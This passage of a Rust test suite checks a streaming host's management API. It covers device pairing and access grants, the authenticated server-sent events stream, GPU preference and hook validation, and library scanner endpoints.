    let del = axum::http::Request::delete("/api/v1/native/pair")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    let (_, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(b["armed"], false);
}

#[tokio::test]
async fn native_unpair_all_empties_the_trust_store() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-np-all-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    np.add("Living room TV", "aa11").unwrap();
    np.add("Studio Deck", "bb22").unwrap();
    assert_eq!(np.list().len(), 2);

    let del_all = || {
        axum::http::Request::delete("/api/v1/native/clients")
            .body(Body::empty())
            .unwrap()
    };
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 2);

    // One persisted write, not two.
    let (_, body) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(body, serde_json::json!([]));
    assert!(np.list().is_empty());
    assert!(!np.is_paired("aa11") && !np.is_paired("bb22"));

    // Idempotent; the single delete 404s a missing fingerprint.
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 0);
}

/// No native plane → 503, matching every other `/native/*`. Not a 200 that claims an unpair.
#[tokio::test]
async fn native_unpair_all_without_a_native_host_is_unavailable() {
    let app = test_app(test_state(), None);
    let req = axum::http::Request::delete("/api/v1/native/clients")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, req).await.0, StatusCode::SERVICE_UNAVAILABLE);
}

#[tokio::test]
async fn pending_devices_approve_and_deny() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-pending-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    let (s, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b.as_array().unwrap().len(), 0);

    np.note_pending("Enrico's MacBook", "aa11", Some(LAN_KNOCK));
    np.note_pending("device bb22cc33", "bb22", Some(LAN_KNOCK));
    let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(b.as_array().unwrap().len(), 2);
    assert_eq!(b[0]["name"], "Enrico's MacBook");
    let approve_id = b[0]["id"].as_u64().unwrap();
    let deny_id = b[1]["id"].as_u64().unwrap();

    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{approve_id}/approve"),
            serde_json::json!({"name": "Office MacBook"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["name"], "Office MacBook");
    assert_eq!(b["fingerprint"], "aa11");
    assert!(np.is_paired("AA11"), "approval pins the fingerprint");

    let deny = post_json(
        &format!("/api/v1/native/pending/{deny_id}/deny"),
        serde_json::json!({}),
    );
    assert_eq!(send(&app, deny).await.0, StatusCode::NO_CONTENT);
    assert!(!np.is_paired("bb22"));
    let (s, _) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{deny_id}/deny"),
            serde_json::json!({}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);

    // Empty `{}` keeps the device's own name; a stale id 404s.
    let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(b.as_array().unwrap().len(), 0);
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pending/123/approve", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

fn patch_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
    axum::http::Request::patch(path)
        .header(axum::http::header::CONTENT_TYPE, "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

/// Host wall clock, unix seconds — relative-in / absolute-stored conversion.
fn wall_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
}

/// Omitted PATCH halves keep their current value; `clear_expiry` makes access permanent.
/// The live-session watch must fire on the same edit.
#[tokio::test]
async fn patch_native_access_reflects_in_list_and_fires_watch() {
    use punktfunk_core::quic::{GRANT_GAMEPAD, GRANT_POINTER};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-patch-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    np.add("Living Room TV", "aa11").unwrap();
    // What a live session holds at admission; the edit must reach it within one event.
    let mut rx = np.subscribe("aa11");

    // 7200 s = 2 hours. Fingerprint path is case-insensitive, like DELETE.
    let now = wall_now();
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/AA11",
            serde_json::json!({"grants": GRANT_GAMEPAD, "expires_in_secs": 7200}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["grants"], GRANT_GAMEPAD);
    assert_eq!(b["access_level"], "controller");
    let deadline = b["expires_unix"].as_i64().unwrap();
    assert!(
        (now + 7200..=now + 7202).contains(&deadline),
        "relative expiry stored as an absolute deadline: {deadline}"
    );
    assert!(b["granted_unix"].as_i64().unwrap() >= now, "grant stamped");

    let (_, list) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(list[0]["grants"], GRANT_GAMEPAD);
    assert_eq!(list[0]["access_level"], "controller");
    assert_eq!(list[0]["expires_unix"].as_i64().unwrap(), deadline);

    assert!(rx.has_changed().unwrap(), "the access watch must fire");
    {
        let state = rx.borrow_and_update();
        assert_eq!(state.grants, GRANT_GAMEPAD);
        assert_eq!(state.deadline_unix, Some(deadline));
        assert!(!state.revoked);
    }

    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"expires_in_secs": 60}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["grants"], GRANT_GAMEPAD, "omitted grants keep current");
    let short_deadline = b["expires_unix"].as_i64().unwrap();
    assert!(short_deadline < deadline, "the expiry did change");

    // Omitted expiry keeps the stored deadline exactly, not re-derived.
    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"grants": 0}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["access_level"], "view");
    assert_eq!(
        b["expires_unix"].as_i64().unwrap(),
        short_deadline,
        "omitted expiry keeps current"
    );

    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"clear_expiry": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert!(b["expires_unix"].is_null(), "clear_expiry = permanent");
    assert_eq!(b["access_level"], "view");

    let (_, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/aa11",
            serde_json::json!({"grants": GRANT_GAMEPAD | GRANT_POINTER}),
        ),
    )
    .await;
    assert_eq!(b["access_level"], "custom");
}

/// Reserved bits and expiry-field conflict 400 without writing. Unknown fingerprint is 404
/// (PATCH is not a pairing path). No native plane is 503.
#[tokio::test]
async fn patch_native_access_validates_and_404s() {
    use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir().join(format!("pf-mgmt-patch-val-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());
    np.add("Deck", "bb22").unwrap();

    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/bb22",
            serde_json::json!({"grants": GRANT_ALL | (1u32 << 30)}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(b["error"].as_str().unwrap().contains("reserved"));
    assert_eq!(np.list()[0].grants, None, "a 400 writes nothing");

    let (s, b) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/bb22",
            serde_json::json!({"expires_in_secs": 60, "clear_expiry": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(b["error"].as_str().unwrap().contains("clear_expiry"));

    let (s, _) = send(
        &app,
        patch_json(
            "/api/v1/native/clients/nope99",
            serde_json::json!({"grants": GRANT_GAMEPAD}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    assert!(!np.is_paired("nope99"), "PATCH must never pair a device");

    let plain = test_app(test_state(), None);
    let (s, _) = send(
        &plain,
        patch_json(
            "/api/v1/native/clients/bb22",
            serde_json::json!({"grants": GRANT_GAMEPAD}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
}

/// `until_disconnect` replaces nothing on its own. Honouring it alone would hand a re-pairing
/// device full permanent control, because `Access` replaces the whole record.
#[tokio::test]
async fn until_disconnect_alone_is_refused_rather_than_widening_access() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir().join(format!("pf-mgmt-lone-udc-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());
    np.note_pending("Guest Phone", "cc33", Some(LAN_KNOCK));
    let id = np.pending()[0].id;

    let (s, _) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"until_disconnect": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(!np.is_paired("cc33"), "a 400 must not consume the knock");
    assert_eq!(np.pending().len(), 1);

    // Arming refuses it on the same terms, and leaves no window open.
    let (s, _) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"until_disconnect": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(!np.status().armed, "a refused arm leaves no window");

    // With an access level beside it, it lands.
    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"grants": 1, "until_disconnect": true}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["until_disconnect"], true);
    assert_eq!(b["grants"], 1, "grants stay what the operator chose");
}

/// The pending list says where a knock came from, and the endpoint refuses to admit one from
/// the internet — the console can hide its Approve button, but the rule is enforced here.
#[tokio::test]
async fn a_wan_knock_is_listed_as_wan_and_refused_by_approve() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir().join(format!("pf-mgmt-wan-knock-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());
    let wan = std::net::IpAddr::V4(std::net::Ipv4Addr::new(203, 0, 113, 5));
    np.note_pending("Friend's Deck", "dd88", Some(wan));
    np.note_pending("Living Room", "ee99", Some(LAN_KNOCK));

    let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
    let rows = b.as_array().unwrap();
    let wan_row = rows.iter().find(|r| r["fingerprint"] == "dd88").unwrap();
    let lan_row = rows.iter().find(|r| r["fingerprint"] == "ee99").unwrap();
    assert_eq!(wan_row["source"], "wan");
    assert_eq!(lan_row["source"], "lan");

    let (s, _) = send(
        &app,
        post_json(
            &format!(
                "/api/v1/native/pending/{}/approve",
                wan_row["id"].as_u64().unwrap()
            ),
            serde_json::json!({}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT, "a WAN knock needs a bound PIN");
    assert!(!np.is_paired("dd88"));
    assert_eq!(
        np.pending().len(),
        2,
        "the refusal leaves the knock waiting"
    );

    // The LAN one goes through, so the refusal is about the source and nothing else.
    let (s, _) = send(
        &app,
        post_json(
            &format!(
                "/api/v1/native/pending/{}/approve",
                lan_row["id"].as_u64().unwrap()
            ),
            serde_json::json!({}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert!(np.is_paired("ee99"));
}

/// Approve pins the chosen mask. Reserved bits 400 without consuming the pending entry.
/// A later re-knock surfaces the stored access.
#[tokio::test]
async fn approve_with_access_pins_the_chosen_mask() {
    use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir()
                    .join(format!("pf-mgmt-approve-acc-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    np.note_pending("Guest Phone", "cc33", Some(LAN_KNOCK));
    let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
    assert!(pend[0]["grants"].is_null());
    assert!(pend[0]["access_level"].is_null());
    let id = pend[0]["id"].as_u64().unwrap();

    let (s, _) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"grants": GRANT_ALL | (1u32 << 31)}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(
        np.pending_contains("cc33"),
        "a 400 must not consume the knock"
    );
    assert!(!np.is_paired("cc33"));

    // 14400 s = 4 hours.
    let now = wall_now();
    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"name": "Guest Phone", "grants": GRANT_GAMEPAD, "expires_in_secs": 14400}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["name"], "Guest Phone");
    assert_eq!(b["grants"], GRANT_GAMEPAD);
    assert_eq!(b["access_level"], "controller");
    let deadline = b["expires_unix"].as_i64().unwrap();
    assert!((now + 14400..=now + 14402).contains(&deadline));
    assert!(b["granted_unix"].as_i64().unwrap() >= now, "grant stamped");
    assert_eq!(np.effective("cc33", now), Some(GRANT_GAMEPAD));

    // Re-knock surfaces the stored access for the approve dialog.
    np.note_pending("Guest Phone", "cc33", Some(LAN_KNOCK));
    let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(pend[0]["grants"], GRANT_GAMEPAD);
    assert_eq!(pend[0]["access_level"], "controller");
    assert_eq!(pend[0]["expires_unix"].as_i64().unwrap(), deadline);
}

/// Armed window carries the choice with relative expiry already absolute. Reserved bits
/// 400 before a window opens.
#[tokio::test]
async fn arm_with_access_ceremony_inherits_the_choice() {
    use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(std::env::temp_dir().join(format!("pf-mgmt-arm-acc-{}.json", std::process::id()))),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    let (s, _) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"grants": GRANT_ALL | (1u32 << 29)}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(!np.status().armed, "a 400 must not arm the window");

    let now = wall_now();
    let (s, b) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"ttl_secs": 60, "grants": GRANT_GAMEPAD, "expires_in_secs": 3600}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["armed"], true);
    let carried = np.armed_access().expect("the window carries the choice");
    assert_eq!(carried.grants, GRANT_GAMEPAD);
    let deadline = carried.expires_unix.expect("absolute deadline");
    assert!((now + 3600..=now + 3602).contains(&deadline));

    // Ceremony consumes `armed_access()`; pairing under it inherits the window's choice.
    np.add_with_access("Guest Deck", "dd44", np.armed_access())
        .unwrap();
    assert_eq!(np.effective("dd44", now), Some(GRANT_GAMEPAD));
    let (_, list) = send(&app, get_req("/api/v1/native/clients")).await;
    assert_eq!(list[0]["access_level"], "controller");
    assert_eq!(list[0]["expires_unix"].as_i64().unwrap(), deadline);
}

/// Omit the access fields: store `None`, derive `full` (legacy permanent record).
#[tokio::test]
async fn approve_and_arm_without_access_fields_keep_todays_behavior() {
    let np = Arc::new(
        crate::native_pairing::NativePairing::load_with(
            Some(
                std::env::temp_dir()
                    .join(format!("pf-mgmt-acc-compat-{}.json", std::process::id())),
            ),
            None,
            false,
        )
        .unwrap(),
    );
    let app = test_app_native(test_state(), np.clone());

    let (s, _) = send(
        &app,
        post_json(
            "/api/v1/native/pair/arm",
            serde_json::json!({"ttl_secs": 60}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(np.armed_access(), None, "no fields = no choice");

    np.note_pending("Old Laptop", "ee55", Some(LAN_KNOCK));
    let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
    let id = pend[0]["id"].as_u64().unwrap();
    let (s, b) = send(
        &app,
        post_json(
            &format!("/api/v1/native/pending/{id}/approve"),
            serde_json::json!({"name": "Old Laptop"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert!(
        b["grants"].is_null(),
        "no choice = the absent-grants record"
    );
    assert!(b["expires_unix"].is_null());
    assert!(b["granted_unix"].is_null());
    assert_eq!(b["access_level"], "full", "absent grants read as full");
    let stored = &np.list()[0];
    assert_eq!(stored.grants, None);
    assert_eq!(stored.expires_unix, None);
    assert_eq!(stored.granted_unix, None);
}

#[tokio::test]
async fn native_endpoints_report_disabled_without_native_host() {
    let app = test_app(test_state(), None);
    let (s, b) = send(&app, get_req("/api/v1/native/pair")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b["enabled"], false);
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pair/arm", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
    // Pending list is `[]`, not 503 (same as `/native/clients`).
    let (s, b) = send(&app, get_req("/api/v1/native/pending")).await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(b.as_array().unwrap().len(), 0);
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pending/0/approve", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
    let (s, _) = send(
        &app,
        post_json("/api/v1/native/pending/0/deny", serde_json::json!({})),
    )
    .await;
    assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
}

fn put_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
    axum::http::Request::put(path)
        .header(axum::http::header::CONTENT_TYPE, "application/json")
        .body(Body::from(body.to_string()))
        .unwrap()
}

/// Inventory GET always answers (empty on a GPU-less box). Preference PUT validates
/// mode + gpu_id before touching the store.
#[tokio::test]
async fn gpu_endpoints_list_and_validate() {
    let app = test_app(test_state(), None);

    let (s, b) = send(&app, get_req("/api/v1/gpus")).await;
    assert_eq!(s, StatusCode::OK);
    assert!(b["gpus"].is_array());
    assert!(b["mode"].is_string());
    // `encoder_pin` is null when nothing is pinned; the console warns when a pin contradicts
    // the selected GPU (the pin is overridden at session open).
    assert!(
        b.as_object().unwrap().contains_key("encoder_pin"),
        "listGpus must carry encoder_pin"
    );

    let (s, _) = send(
        &app,
        put_json(
            "/api/v1/gpus/preference",
            serde_json::json!({"mode": "fastest"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    let (s, _) = send(
        &app,
        put_json(
            "/api/v1/gpus/preference",
            serde_json::json!({"mode": "manual"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    let (s, _) = send(
        &app,
        put_json(
            "/api/v1/gpus/preference",
            serde_json::json!({"mode": "manual", "gpu_id": "ffff-ffff-9"}),
        ),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn logs_endpoint_pages_by_cursor() {
    let app = test_app(test_state(), None);

    // Process-wide ring; other tests log into it. Assert on our markers inside the page,
    // never that the page is exactly ours.
    let (s, json) = send(&app, get_req("/api/v1/logs")).await;
    assert_eq!(s, StatusCode::OK);
    let start = json["next"].as_u64().unwrap();

    let ring = crate::log_capture::ring();
    ring.push(&tracing::Level::WARN, "mgmt::tests", "first".into());
    ring.push(&tracing::Level::INFO, "mgmt::tests", "second".into());

    let (s, json) = send(&app, get_req(&format!("/api/v1/logs?after={start}"))).await;
    assert_eq!(s, StatusCode::OK);
    let entries = json["entries"].as_array().unwrap();
    let ours: Vec<_> = entries
        .iter()
        .filter(|e| e["target"] == "mgmt::tests")
        .collect();
    assert_eq!(ours.len(), 2, "both markers on the page, in order");
    assert_eq!(ours[0]["msg"], "first");
    assert_eq!(ours[0]["level"], "WARN");
    assert_eq!(ours[1]["msg"], "second");
    let next = json["next"].as_u64().unwrap();
    assert_eq!(
        next,
        start + entries.len() as u64,
        "the cursor advances by exactly the entries served"
    );
    assert_eq!(json["dropped"], false);

    // Concurrent tests may add entries; our already-served markers must not appear again.
    let (s, json) = send(&app, get_req(&format!("/api/v1/logs?after={next}"))).await;
    assert_eq!(s, StatusCode::OK);
    assert!(json["entries"]
        .as_array()
        .unwrap()
        .iter()
        .all(|e| e["target"] != "mgmt::tests"));
    assert!(json["next"].as_u64().unwrap() >= next);
}

// ------------------------------------------------------------------ events (SSE)

/// Serializes events-route tests: they share the process-global bus and the connection-cap
/// counter, so the cap test must never 503 a concurrently running stream test.
static EVENTS_TEST_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// `get_req` plus the default bearer; these tests read streaming bodies instead of `send`.
fn events_req(path: &str) -> axum::http::Request<Body> {
    let mut req = get_req(path);
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_static("Bearer test-secret"),
    );
    req
}

async fn next_sse_chunk(body: &mut Body) -> Option<String> {
    match tokio::time::timeout(std::time::Duration::from_secs(5), body.frame()).await {
        Ok(Some(Ok(frame))) => frame
            .into_data()
            .ok()
            .map(|b| String::from_utf8_lossy(&b).into_owned()),
        _ => None,
    }
}

fn sse_data_events(text: &str) -> Vec<serde_json::Value> {
    text.lines()
        .filter_map(|l| l.strip_prefix("data: "))
        .filter_map(|d| serde_json::from_str(d).ok())
        .collect()
}

#[tokio::test]
async fn events_stream_requires_bearer() {
    let app = test_app(test_state(), None);
    let mut req = get_req("/api/v1/events");
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_static("Bearer wrong"),
    );
    let resp = app.clone().oneshot(req).await.expect("infallible");
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

/// Ring catch-up, kind filter, live tail, `?since=` / `Last-Event-ID` resume, and `dropped`
/// when the cursor fell off the ring.
#[tokio::test]
async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
    use crate::events::EventKind;
    let _l = EVENTS_TEST_LOCK.lock().await;
    let app = test_app(test_state(), None);
    let uniq = format!("evt-{}-{:p}", std::process::id(), &0u8 as *const u8);
    let m1 = format!("{uniq}-one");

    crate::events::emit(EventKind::DisplayReleased { count: 424_242 });
    crate::events::emit(EventKind::LibraryChanged { source: m1.clone() });

    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events?kinds=library.changed"))
        .await
        .expect("infallible");
    assert_eq!(resp.status(), StatusCode::OK);
    let ctype = resp
        .headers()
        .get(axum::http::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();
    assert!(
        ctype.starts_with("text/event-stream"),
        "content-type: {ctype}"
    );

    // Catch-up must deliver m1; other tests' library.changed events may interleave — scan.
    let mut body = resp.into_body();
    let mut seen = String::new();
    while !seen.contains(&m1) {
        let chunk = next_sse_chunk(&mut body)
            .await
            .expect("catch-up delivers the marker event");
        seen.push_str(&chunk);
    }
    assert!(
        !seen.contains("event: display.released"),
        "kind filter must drop other kinds: {seen}"
    );
    assert!(
        seen.contains("event: library.changed"),
        "frame kind: {seen}"
    );
    let m1_seq = sse_data_events(&seen)
        .iter()
        .find(|e| e["source"] == m1.as_str())
        .and_then(|e| e["seq"].as_u64())
        .expect("marker frame carries the full event JSON with its seq");

    // Live tail on the same connection. If a concurrent flood cuts the slow consumer, reconnect
    // with the last seen id (the documented client move) instead of flaking.
    let m2 = format!("{uniq}-two");
    crate::events::emit(EventKind::LibraryChanged { source: m2.clone() });
    let mut tail = String::new();
    loop {
        match next_sse_chunk(&mut body).await {
            Some(chunk) => {
                tail.push_str(&chunk);
                if tail.contains(&m2) {
                    break;
                }
            }
            None => {
                let resp = app
                    .clone()
                    .oneshot(events_req(&format!(
                        "/api/v1/events?since={m1_seq}&kinds=library.changed"
                    )))
                    .await
                    .expect("infallible");
                body = resp.into_body();
            }
        }
    }
    drop(body);
    // The `live` marker closes the catch-up: it must come after m1, never before it.
    let all = format!("{seen}{tail}");
    let live_at = all
        .find("event: live")
        .unwrap_or_else(|| panic!("no live marker: {all}"));
    assert!(
        live_at > all.find(&m1).unwrap(),
        "live before catch-up: {all}"
    );

    let resp = app
        .clone()
        .oneshot(events_req(&format!(
            "/api/v1/events?since={m1_seq}&kinds=library.changed"
        )))
        .await
        .expect("infallible");
    let mut body = resp.into_body();
    let mut resumed = String::new();
    while !resumed.contains(&m2) {
        let chunk = next_sse_chunk(&mut body)
            .await
            .expect("resume catch-up delivers m2");
        resumed.push_str(&chunk);
    }
    assert!(!resumed.contains(&m1), "since-cursor must exclude m1");
    drop(body);

    // Last-Event-ID beats `?since` (newer cursor on SSE auto-reconnect).
    let mut req = events_req("/api/v1/events?since=0&kinds=library.changed");
    req.headers_mut().insert(
        "last-event-id",
        axum::http::HeaderValue::from_str(&m1_seq.to_string()).unwrap(),
    );
    let resp = app.clone().oneshot(req).await.expect("infallible");
    let mut body = resp.into_body();
    let mut resumed = String::new();
    while !resumed.contains(&m2) {
        let chunk = next_sse_chunk(&mut body)
            .await
            .expect("header-resume catch-up delivers m2");
        resumed.push_str(&chunk);
    }
    assert!(!resumed.contains(&m1), "Last-Event-ID must exclude m1");
    drop(body);

    // 1100 > ring capacity; resume from seq 1 must get the dropped marker first.
    for _ in 0..1100 {
        crate::events::emit(EventKind::DisplayReleased { count: 1 });
    }
    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events?since=1"))
        .await
        .expect("infallible");
    let mut body = resp.into_body();
    let first = next_sse_chunk(&mut body).await.expect("dropped marker");
    assert!(first.contains("event: dropped"), "first frame: {first}");
    assert!(
        first.contains(r#"{"dropped":true}"#),
        "marker data: {first}"
    );
}

#[tokio::test]
async fn events_stream_connection_cap() {
    let _l = EVENTS_TEST_LOCK.lock().await;
    let app = test_app(test_state(), None);

    let slots = super::events::test_support::saturate_slots();
    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events"))
        .await
        .expect("infallible");
    assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
    drop(slots);

    let resp = app
        .clone()
        .oneshot(events_req("/api/v1/events"))
        .await
        .expect("infallible");
    assert_eq!(resp.status(), StatusCode::OK, "cap frees with the slots");
}

// ------------------------------------------------------------------ hooks

/// GET shape + PUT validation. A successful PUT would write the real config dir;
/// persistence is unit-tested in `crate::hooks` against a temp path.
#[tokio::test]
async fn hooks_get_shape_and_put_validation() {
    let app = test_app(test_state(), None);

    let (s, json) = send(&app, get_req("/api/v1/hooks")).await;
    assert_eq!(s, StatusCode::OK);
    assert!(json["hooks"].is_array());

    let put = |body: serde_json::Value| {
        axum::http::Request::put("/api/v1/hooks")
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    let (s, json) = send(
        &app,
        put(serde_json::json!({"hooks": [{"on": "stream.started"}]})),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
    assert!(
        json["error"].as_str().unwrap().contains("run"),
        "error names the problem: {json}"
    );

    let (s, _) = send(
        &app,
        put(serde_json::json!({"hooks": [{"on": "pairing.*", "webhook": "ftp://x"}]})),
    )
    .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);

    let mut req = get_req("/api/v1/hooks");
    req.headers_mut().insert(
        axum::http::header::AUTHORIZATION,
        axum::http::HeaderValue::from_static("Bearer wrong"),
    );
    let resp = app.clone().oneshot(req).await.expect("infallible");
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

// ------------------------------------------------------------------ library scanners

/// Toggle 404s unknown ids. A successful PUT would write `library-scanners.json` in the
/// real config dir, so only the rejection path is exercised here. Every row is a plugin;
/// an empty list is legitimate when no library plugins are installed.
#[tokio::test]
async fn library_scanner_list_and_unknown_toggle() {
    let app = test_app(test_state(), None);

    let (s, json) = send(&app, get_req("/api/v1/library/scanners")).await;
    assert_eq!(s, StatusCode::OK);
    let scanners = json.as_array().expect("a scanner array");
    assert!(
        scanners.iter().all(|sc| sc["origin"] == "plugin"),
        "no host build reports a builtin source any more: {json}"
    );
    assert!(
        scanners.iter().all(|sc| sc["id"].is_string()
            && sc["label"].is_string()
            && sc["enabled"].is_boolean()),
        "every source row must carry the shape the console renders: {json}"
    );
    // `custom` is a store, never a source — the toggle must not offer it.
    assert!(scanners.iter().all(|sc| sc["id"] != "custom"));

    let (s, json) = send(
        &app,
        axum::http::Request::put("/api/v1/library/scanners/not-a-store")
            .header(axum::http::header::CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::json!({"enabled": false}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(
        s,
        StatusCode::NOT_FOUND,
        "unknown source id must 404: {json}"
    );
}

/// Library ids are `<store>:<external_id>` (Heroic has two colons). If the router split on
/// `:`, hide would 404 an id the host produced. The body is invalid on purpose so we never
/// write `library-hidden.json` into the real config dir.
#[tokio::test]
async fn hide_route_matches_ids_containing_colons() {
    let app = test_app(test_state(), None);
    let put = |id: &str| {
        axum::http::Request::put(format!("/api/v1/library/hidden/{id}"))
            .header(axum::http::header::CONTENT_TYPE, "application/json")
